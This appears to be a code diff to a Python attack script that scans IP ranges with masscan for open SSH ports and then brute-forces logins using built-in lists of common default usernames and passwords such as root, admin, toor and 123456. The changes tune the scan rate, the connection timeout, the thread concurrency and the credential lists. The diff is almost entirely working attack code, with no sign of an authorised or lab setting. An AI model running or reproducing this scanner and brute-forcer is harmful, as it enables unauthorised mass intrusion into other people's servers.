@@ -45,7 +45,7 @@ def run_masscan(ip_range):
     output_file = "masscan_output.txt"
     try:
         print(f"Running masscan on the range {ip_range}...")
-        subprocess.run(["masscan", ip_range, "-p22", "--rate", "500", "-oL", output_file], check=True)
+        subprocess.run(["masscan", ip_range, "-p22", "--rate", "200", "-oL", output_file], check=True)
         return output_file
     except subprocess.CalledProcessError as e:
         print(f"Error running masscan: {e}")
@@ -69,7 +69,7 @@ def is_valid_ip(ip):
     except ipaddress.AddressValueError:
         return False
 
-def attempt_ssh_connection(hostname, port, username, password, timeout=12):
+def attempt_ssh_connection(hostname, port, username, password, timeout=8):
     if hostname in skipped_ips:
         return
 
@@ -120,10 +120,10 @@ else:
 successful_connections = []
 skipped_ips = set()
 
-users = ['root', 'admin', 'user', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server', 'localadmin', 'webadmin']
-password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '321', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']
+users = ['root', 'admin', 'user', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server']
+password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '1234567', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']
 
-max_concurrent_connections = 30
+max_concurrent_connections = 40
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_connections) as executor:
     for user in users:
